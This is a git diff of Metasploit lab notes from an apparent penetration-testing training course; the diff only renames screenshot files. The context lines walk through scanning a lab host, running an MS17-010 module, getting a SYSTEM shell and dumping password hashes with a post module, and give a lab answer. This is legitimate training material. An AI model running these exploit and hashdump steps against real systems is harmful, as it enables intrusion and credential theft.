@@ -28,7 +28,7 @@ Modules -> prepared scripts to exploits
   * exploit/windows/ftp/scriptftp\_list
 * Search -> `help search` f.e.: `search eternalromance`
 * Specific search -> `search type:exploit platform:windows cve:2021 rank:excellent microsoft`
-* `Module selection -> nmap -sV <IP> ->` ![](<.gitbook/assets/image (17).png>)
+* `Module selection -> nmap -sV <IP> ->` ![](<.gitbook/assets/image (17) (1).png>)
   * `search ms17_010 -> use 0 -> options -> info`
     * `set RHOSTS <IP>... run`
 
@@ -160,15 +160,15 @@ Given IP: `10.129.203.65`
 
 msf -> `db_nmap -sV -p- -T5 -A 10.129.203.65`
 
-<figure><img src=".gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (14) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 msf -> `hosts`
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 msf -> `services`
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 5000 -> HTTP -> go to website 10.129.203.65:5000
 
@@ -185,13 +185,13 @@ msf -> `set RHOSTS 10.129.203.65`
 
 msf -> `run`
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `shell`
 
 `whoami`
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ANSWER: **`nt authority\system`**
 
@@ -201,4 +201,4 @@ msf -> `exit`
 
 msf -> `run post/windows/gather/hashdump`
 
-<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
